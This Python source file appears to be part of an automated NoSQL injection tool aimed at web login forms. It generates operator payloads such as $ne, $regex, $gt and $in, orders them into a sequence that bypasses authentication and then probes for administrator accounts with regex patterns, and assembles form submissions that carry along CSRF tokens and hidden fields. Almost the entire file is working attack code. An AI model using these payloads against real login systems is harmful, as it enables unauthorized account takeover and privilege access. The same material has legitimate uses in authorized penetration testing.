from typing import List, Dict, Any, Optional
from dataclasses import dataclass


@dataclass
class NoSQLPayload:
    username_payload: Any
    password_payload: Any
    phase: str
    description: str


class NoSQLPayloadGenerator:
    def __init__(self, admin_patterns: Optional[List[str]] = None):
        self.admin_patterns = admin_patterns or [
            "admin.*",
            "administrator.*",
            "root.*",
            ".*admin.*",
            "adm.*"
        ]
    
    def generate_progressive_sequence(self, test_password: str = "test") -> List[NoSQLPayload]:
        sequence = []
        
        sequence.append(NoSQLPayload(
            username_payload={"$ne": ""},
            password_payload=test_password,
            phase="basic_bypass",
            description="Basic bypass: username with $ne operator"
        ))
        
        sequence.append(NoSQLPayload(
            username_payload={"$regex": ".*"},
            password_payload=test_password,
            phase="regex_test",
            description="Regex capability test: username with $regex operator"
        ))
        
        sequence.append(NoSQLPayload(
            username_payload={"$ne": ""},
            password_payload={"$ne": ""},
            phase="multiple_user",
            description="Multiple user detection: both fields with $ne operator"
        ))
        
        for pattern in self.admin_patterns:
            sequence.append(NoSQLPayload(
                username_payload={"$regex": pattern},
                password_payload={"$ne": ""},
                phase="admin_discovery",
                description=f"Admin discovery: username with regex pattern '{pattern}'"
            ))
        
        return sequence
    
    def generate_comprehensive_payloads(self) -> List[NoSQLPayload]:
        payloads = []
        
        comparison_ops = [
            ("$ne", ""),
            ("$ne", None),
            ("$gt", ""),
            ("$lt", ""),
            ("$gte", ""),
            ("$lte", ""),
            ("$eq", ""),
        ]
        
        for op, value in comparison_ops:
            payloads.append(NoSQLPayload(
                username_payload={op: value},
                password_payload="test",
                phase="comprehensive",
                description=f"Comparison operator: {op}"
            ))
        
        logical_ops = [
            {"$or": [{"username": "admin"}, {"username": {"$ne": None}}]},
            {"$and": [{"username": {"$ne": ""}}, {"password": {"$ne": ""}}]},
        ]
        
        for op_payload in logical_ops:
            payloads.append(NoSQLPayload(
                username_payload=op_payload,
                password_payload="test",
                phase="comprehensive",
                description="Logical operator test"
            ))
        
        element_ops = [
            {"$exists": True},
            {"$type": "string"},
        ]
        
        for op_payload in element_ops:
            payloads.append(NoSQLPayload(
                username_payload=op_payload,
                password_payload="test",
                phase="comprehensive",
                description="Element operator test"
            ))
        
        array_ops = [
            {"$in": [None, "", "admin"]},
            {"$nin": ["wrong"]},
        ]
        
        for op_payload in array_ops:
            payloads.append(NoSQLPayload(
                username_payload=op_payload,
                password_payload="test",
                phase="comprehensive",
                description="Array operator test"
            ))
        
        return payloads
    
    def build_payload_dict(self, nosql_payload: NoSQLPayload, 
                          form_data) -> Dict[str, Any]:
        # Try to get 'name' attribute first, fallback to 'id' if name is not available
        username_field = None
        password_field = None
        
        if form_data.username_input:
            username_field = form_data.username_input.get('name')
            if not username_field:
                username_field = form_data.username_input.get('id')
        
        if form_data.password_input:
            password_field = form_data.password_input.get('name')
            if not password_field:
                password_field = form_data.password_input.get('id')
        
        if not username_field or not password_field:
            raise ValueError("Form input fields missing 'name' or 'id' attribute")
        
        payload_data = {
            username_field: nosql_payload.username_payload,
            password_field: nosql_payload.password_payload
        }
        
        if form_data.csrf_input:
            csrf_name = form_data.csrf_input.get('name')
            csrf_value = form_data.csrf_input.get('value')
            if csrf_name and csrf_value:
                payload_data[csrf_name] = csrf_value
        
        for other_input in form_data.other_inputs:
            other_name = other_input.get('name')
            other_value = other_input.get('value')
            if other_name and other_value:
                payload_data[other_name] = other_value
        
        return payload_data

